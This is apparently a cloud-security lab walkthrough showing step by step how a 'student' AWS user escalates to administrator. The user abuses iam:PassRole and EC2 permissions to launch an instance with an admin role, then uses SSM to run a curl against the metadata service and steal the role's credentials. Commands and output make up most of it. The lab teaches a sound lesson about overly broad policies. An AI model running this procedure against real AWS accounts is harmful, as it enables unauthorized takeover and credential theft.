# Pass Role: EC2

Overly Permissive Permission can be abused by a user to perform privileged operations.

Objective: Leverage the policy attached to the student user and attain administrative privileges on the AWS account.

----

1. Get access to AWS lab credentials.
2. Configure AWS CLI.
3. List the policies and the inline policies attached to the `student` user:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-attached-user-policies --user-name student
{
    "AttachedPolicies": [
        {
            "PolicyName": "AmazonEC2ReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AmazonEC2ReadOnlyAccess"
        },
        {
            "PolicyName": "IAMReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
        }
    ]
}
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ aws iam list-user-policies --user-name student
{
    "PolicyNames": [
        "ConfigureEC2Role"
    ]
}
```

4. Try creating a user on the AWS account:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam create-user --user-name Bob

An error occurred (AccessDenied) when calling the CreateUser operation: User: arn:aws:iam::079386327979:user/student is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::079386327979:user/Bob because no identity-based policy allows the iam:CreateUser action
```

User creation failed due to insufficient privileges.

5. Check the policy permissions and details:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam get-user-policy --user-name student --policy-name ConfigureEC2Role
{
    "UserName": "student",
    "PolicyName": "ConfigureEC2Role",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    "iam:PassRole",
                    "ec2:RunInstances",
                    "ec2:Describe*",
                    "ec2:TerminateInstances",
                    "ssm:*"
                ],
                "Resource": "*"
            }
        ]
    }
}
```

The `student` user can run EC2 instances and pass a role to the EC2 instance. Since the `student` user also has permission to interact with the SSM service, the student user can execute commands on the EC2 instances via SSM.

6. List role on AWS account which can be passed to EC2 service:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-roles
{
    "Roles": [
        ...
        {
            "Path": "/",
            "RoleName": "ec2admin",
            "RoleId": "AROARE66LHOVV2VPWYOZK",
            "Arn": "arn:aws:iam::079386327979:role/ec2admin",
            "CreateDate": "2023-05-12T11:56:29+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "ec2.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        ...
    ]
}
```

7. Check `ec2admin` role policies and permissions:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-role-policies --role-name ec2admin
{
    "PolicyNames": [
        "terraform-20230512115630147100000003"
    ]
}
```

8. Check policy permissions:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam get-role-policy --role-name ec2admin --policy-name terraform-20230512115630147100000003
{
    "RoleName": "ec2admin",
    "PolicyName": "terraform-20230512115630147100000003",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }
        ]
    }
}
```

The `ec2admin` role allows `AdministratorAccess` on the AWS account.

9. Find AMI id for Amazon Linux 2 AMI:

```text
┌──(kali㉿kali)-[~]
└─$ aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output json |jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId'
ami-00f1dd92f5c4956da
```

The AMI id is ami-00f1dd92f5c4956da

10. Check the subnets available in the AWS account:

```text
┌──(kali㉿kali)-[~]
└─$ aws ec2 describe-subnets
{
    "Subnets": [
        {
            "AvailabilityZone": "us-east-1e",
            "AvailabilityZoneId": "use1-az3",
            "AvailableIpAddressCount": 247,
            "CidrBlock": "10.0.1.0/24",
            "DefaultForAz": false,
            "MapPublicIpOnLaunch": false,
            "MapCustomerOwnedIpOnLaunch": false,
            "State": "available",
            "SubnetId": "subnet-03efab3cb920c03ed",
            "VpcId": "vpc-041bfbb369de7dace",
            "OwnerId": "079386327979",
            "AssignIpv6AddressOnCreation": false,
            "Ipv6CidrBlockAssociationSet": [],
            "SubnetArn": "arn:aws:ec2:us-east-1:079386327979:subnet/subnet-03efab3cb920c03ed",
            "EnableDns64": false,
            "Ipv6Native": false,
            "PrivateDnsNameOptionsOnLaunch": {
                "HostnameType": "ip-name",
                "EnableResourceNameDnsARecord": false,
                "EnableResourceNameDnsAAAARecord": false
            }
        }
    ]
}
```

Make a note of `SubnetId`.

11. Check security groups for ec2 service:

```text
┌──(kali㉿kali)-[~]
└─$ aws ec2 describe-security-groups
{
    "SecurityGroups": [
        ...
        {
            "Description": "FullAccess",
            "GroupName": "FullAccess",
            "IpPermissions": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": []
                }
            ],
            "OwnerId": "079386327979",
            "GroupId": "sg-0ba7b7a5554178517",
            "IpPermissionsEgress": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": []
                }
            ],
            "VpcId": "vpc-041bfbb369de7dace"
        }
    ]
}
```

Make a note of the security group id.

12. List instance profiles for the AWS account:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-instance-profiles
{
    "InstanceProfiles": [
        {
            "Path": "/",
            "InstanceProfileName": "ec2_admin",
            "InstanceProfileId": "AIPARE66LHOV32VYGVJ3M",
            "Arn": "arn:aws:iam::079386327979:instance-profile/ec2_admin",
            "CreateDate": "2023-05-12T11:56:30+00:00",
            "Roles": [
                {
                    "Path": "/",
                    "RoleName": "ec2admin",
                    "RoleId": "AROARE66LHOVV2VPWYOZK",
                    "Arn": "arn:aws:iam::079386327979:role/ec2admin",
                    "CreateDate": "2023-05-12T11:56:29+00:00",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "ec2.amazonaws.com"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    }
                }
            ]
        }
    ]
}
```

Make a note of the ec2 instance profile name.

13. Start an ec2 instance using collected details:

```text
┌──(kali㉿kali)-[~]
└─$ aws ec2 run-instances --subnet-id subnet-03efab3cb920c03ed --image-id ami-00f1dd92f5c4956da --iam-instance-profile Name=ec2_admin --instance-type t2.micro --security-group-ids "sg-0ba7b7a5554178517"
{
    "Groups": [],
    "Instances": [
        {
            "AmiLaunchIndex": 0,
            "ImageId": "ami-00f1dd92f5c4956da",
            "InstanceId": "i-0717ef48404b5ab06",
            "InstanceType": "t2.micro",
            "LaunchTime": "2023-05-12T12:42:16+00:00",
            "Monitoring": {
                "State": "disabled"
            },
            "Placement": {
                "AvailabilityZone": "us-east-1e",
                "GroupName": "",
                "Tenancy": "default"
            },
            "PrivateDnsName": "ip-10-0-1-177.ec2.internal",
            "PrivateIpAddress": "10.0.1.177",
            "ProductCodes": [],
            "PublicDnsName": "",
            "State": {
                "Code": 0,
                "Name": "pending"
            },
            "StateTransitionReason": "",
            "SubnetId": "subnet-03efab3cb920c03ed",
            "VpcId": "vpc-041bfbb369de7dace",
            "Architecture": "x86_64",
            "BlockDeviceMappings": [],
            "ClientToken": "2dcb85fa-f35d-4eb5-b237-aa14fcb074a9",
            "EbsOptimized": false,
            "EnaSupport": true,
            "Hypervisor": "xen",
            "IamInstanceProfile": {
                "Arn": "arn:aws:iam::079386327979:instance-profile/ec2_admin",
                "Id": "AIPARE66LHOV32VYGVJ3M"
            },
            "NetworkInterfaces": [
                {
                    "Attachment": {
                        "AttachTime": "2023-05-12T12:42:16+00:00",
                        "AttachmentId": "eni-attach-0b91e698acd285731",
                        "DeleteOnTermination": true,
                        "DeviceIndex": 0,
                        "Status": "attaching",
                        "NetworkCardIndex": 0
                    },
                    "Description": "",
                    "Groups": [
                        {
                            "GroupName": "FullAccess",
                            "GroupId": "sg-0ba7b7a5554178517"
                        }
                    ],
                    "Ipv6Addresses": [],
                    "MacAddress": "06:a2:32:cd:92:87",
                    "NetworkInterfaceId": "eni-0e70518e5a1afee36",
                    "OwnerId": "079386327979",
                    "PrivateDnsName": "ip-10-0-1-177.ec2.internal",
                    "PrivateIpAddress": "10.0.1.177",
                    "PrivateIpAddresses": [
                        {
                            "Primary": true,
                            "PrivateDnsName": "ip-10-0-1-177.ec2.internal",
                            "PrivateIpAddress": "10.0.1.177"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Status": "in-use",
                    "SubnetId": "subnet-03efab3cb920c03ed",
                    "VpcId": "vpc-041bfbb369de7dace",
                    "InterfaceType": "interface"
                }
            ],
            "RootDeviceName": "/dev/xvda",
            "RootDeviceType": "ebs",
            "SecurityGroups": [
                {
                    "GroupName": "FullAccess",
                    "GroupId": "sg-0ba7b7a5554178517"
                }
            ],
            "SourceDestCheck": true,
            "StateReason": {
                "Code": "pending",
                "Message": "pending"
            },
            "VirtualizationType": "hvm",
            "CpuOptions": {
                "CoreCount": 1,
                "ThreadsPerCore": 1
            },
            "CapacityReservationSpecification": {
                "CapacityReservationPreference": "open"
            },
            "MetadataOptions": {
                "State": "pending",
                "HttpTokens": "optional",
                "HttpPutResponseHopLimit": 1,
                "HttpEndpoint": "enabled",
                "HttpProtocolIpv6": "disabled",
                "InstanceMetadataTags": "disabled"
            },
            "EnclaveOptions": {
                "Enabled": false
            },
            "PrivateDnsNameOptions": {
                "HostnameType": "ip-name",
                "EnableResourceNameDnsARecord": false,
                "EnableResourceNameDnsAAAARecord": false
            },
            "MaintenanceOptions": {
                "AutoRecovery": "default"
            },
            "CurrentInstanceBootMode": "legacy-bios"
        }
    ],
    "OwnerId": "079386327979",
    "ReservationId": "r-016cf1e6bd5c64fc1"
}
```

14. Run commands on the remote ec2 instance using SSM:

```text
┌──(kali㉿kali)-[~]
└─$ aws ssm send-command --document-name "AWS-RunShellScript" --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' --targets "Key=instanceids,Values=i-0717ef48404b5ab06" --comment "Retrieving Token"
{
    "Command": {
        "CommandId": "f6ad576a-e890-4d35-bca5-5c03843e0f98",
        "DocumentName": "AWS-RunShellScript",
        "DocumentVersion": "$DEFAULT",
        "Comment": "Retrievong Token",
        "ExpiresAfter": "2023-05-12T10:49:11.764000-04:00",
        "Parameters": {
            "commands": [
                "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"
            ]
        },
        "InstanceIds": [],
        "Targets": [
            {
                "Key": "instanceids",
                "Values": [
                    "i-0717ef48404b5ab06"
                ]
            }
        ],
        "RequestedDateTime": "2023-05-12T08:49:11.764000-04:00",
        "Status": "Pending",
        "StatusDetails": "Pending",
        "OutputS3Region": "us-east-1",
        "OutputS3BucketName": "",
        "OutputS3KeyPrefix": "",
        "MaxConcurrency": "50",
        "MaxErrors": "0",
        "TargetCount": 0,
        "CompletedCount": 0,
        "ErrorCount": 0,
        "DeliveryTimedOutCount": 0,
        "ServiceRole": "",
        "NotificationConfig": {
            "NotificationArn": "",
            "NotificationEvents": [],
            "NotificationType": ""
        },
        "CloudWatchOutputConfig": {
            "CloudWatchLogGroupName": "",
            "CloudWatchOutputEnabled": false
        },
        "TimeoutSeconds": 3600,
        "AlarmConfiguration": {
            "IgnorePollAlarmFailure": false,
            "Alarms": []
        },
        "TriggeredAlarms": []
    }
}
```

Make a note of command id. The executed command will interact with the metadata service and print out the temporary access credentials of the role associated with the EC2 instance.

15. Get the command’s output using SSM:

```text
┌──(kali㉿kali)-[~]
└─$ aws ssm get-command-invocation --command-id "f6ad576a-e890-4d35-bca5-5c03843e0f98" --instance-id "i-0717ef48404b5ab06"
{
    "CommandId": "f6ad576a-e890-4d35-bca5-5c03843e0f98",
    "InstanceId": "i-0717ef48404b5ab06",
    "Comment": "Retrieving Token",
    "DocumentName": "AWS-RunShellScript",
    "DocumentVersion": "$DEFAULT",
    "PluginName": "aws:runShellScript",
    "ResponseCode": 0,
    "ExecutionStartDateTime": "2023-05-12T12:49:12.236Z",
    "ExecutionElapsedTime": "PT0.056S",
    "ExecutionEndDateTime": "2023-05-12T12:49:12.236Z",
    "Status": "Success",
    "StatusDetails": "Success",
    "StandardOutputContent": "{\n  \"Code\" : \"Success\",\n  \"LastUpdated\" : \"2023-05-12T12:41:53Z\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"<access key id>\",\n  \"SecretAccessKey\" : \"<secret access key>\",\n  \"Token\" : \"<session token>\",\n  \"Expiration\" : \"2023-05-12T19:17:18Z\"\n}",
    "StandardOutputUrl": "",
    "StandardErrorContent": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100  1590  100  1590    0     0   388k      0 --:--:-- --:--:-- --:--:--  388k\n",
    "StandardErrorUrl": "",
    "CloudWatchOutputConfig": {
        "CloudWatchLogGroupName": "",
        "CloudWatchOutputEnabled": false
    }
}
```

Command execution is successful. Make a note of Access keys and session tokens.

16. Note down access keys from the command output and assume the ec2admin role by
exporting access key id, secret access key, and session token as environment variables:

```text
export AWS_ACCESS_KEY_ID=<access key id>
export AWS_SECRET_ACCESS_KEY=<secret access key>
export AWS_SESSION_TOKEN=<session token>
```

17. Check caller identity to confirm whether assuming role was successful:

```text
┌──(kali㉿kali)-[~]
└─$ aws sts get-caller-identity
```
Role assumed successfully.

18. Try creating a new user on the AWS account to verify Administrative privileges:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam create-user --user-name Bob
```

Successfully performed a privileged operation.


